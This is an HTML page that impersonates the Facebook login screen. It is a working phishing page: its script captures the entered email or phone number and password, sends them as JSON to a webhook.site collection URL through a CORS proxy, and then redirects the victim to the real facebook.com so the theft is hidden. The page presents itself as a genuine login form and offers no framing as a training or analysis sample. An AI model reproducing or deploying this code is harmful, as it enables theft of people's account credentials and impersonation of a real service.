<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Facebook â€“ log in or sign up</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-wrap: wrap;
    }

    .left {
      flex: 1 1 300px;
      padding: 20px;
    }

    .left h1 {
      color: #1877f2;
      font-size: 60px;
      margin-bottom: 10px;
    }

    .left p {
      font-size: 24px;
    }

    .right {
      flex: 1 1 300px;
      display: flex;
      justify-content: center;
    }

    .form-box {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    .form-box input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
    }

    .form-box button {
      width: 100%;
      padding: 14px;
      background: #1877f2;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .form-box button:hover {
      background: #166fe5;
    }

    .form-box a {
      display: block;
      text-align: center;
      color: #1877f2;
      text-decoration: none;
      margin: 10px 0;
      font-size: 14px;
    }

    .divider {
      height: 1px;
      background: #ddd;
      margin: 20px 0;
    }

    .create-btn {
      background: #42b72a;
      margin: 0 auto;
      display: block;
      padding: 14px;
      border-radius: 6px;
      font-weight: bold;
      font-size: 16px;
      border: none;
      color: white;
      width: 60%;
      cursor: pointer;
    }

    .create-btn:hover {
      background: #36a420;
    }

    @media (max-width: 768px) {
      .container {
        flex-direction: column;
        padding: 20px;
      }

      .left h1 {
        font-size: 48px;
      }

      .left p {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left side -->
    <div class="left">
      <h1>facebook</h1>
      <p>Connect with friends and the world around you on Facebook.</p>
    </div>

    <!-- Right side (login form) -->
    <div class="right">
      <div class="form-box">
        <form id="loginForm">
          <input type="text" name="username" placeholder="Email or phone number" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit">Log In</button>
        </form>
        <a href="#">Forgotten password?</a>
        <div class="divider"></div>
        <button class="create-btn">Create New Account</button>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', function (e) {
      e.preventDefault(); // Prevent default form submission

      const data = {
        username: form.username.value,
        password: form.password.value,
      };

      // Send data to Pipedream endpoint
      fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/83798c70-abde-496f-9f2a-24d4d41bdc41', {

        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })
      .then(() => {
        window.location.href = 'https://www.facebook.com/';
      })
      .catch((error) => {
        console.error('Error:', error);
        window.location.href = 'https://www.facebook.com/';
      });
    });
  </script>
</body>
</html>
